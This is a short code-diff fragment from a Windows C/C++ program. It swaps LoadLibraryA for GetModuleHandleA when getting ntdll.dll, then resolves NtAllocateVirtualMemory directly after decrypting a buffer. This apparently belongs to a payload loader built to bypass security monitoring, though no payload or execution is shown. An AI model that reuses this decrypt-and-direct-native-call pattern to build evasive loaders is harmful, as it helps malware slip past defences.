@@ -115,7 +115,7 @@ int main()
         &decryptedLen))
         return -1;
 
-    HMODULE ntdll = LoadLibraryA("ntdll.dll");
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 
     auto NtAllocateVirtualMemory =
         (NtAllocateVirtualMemory_t)GetProcAddress(
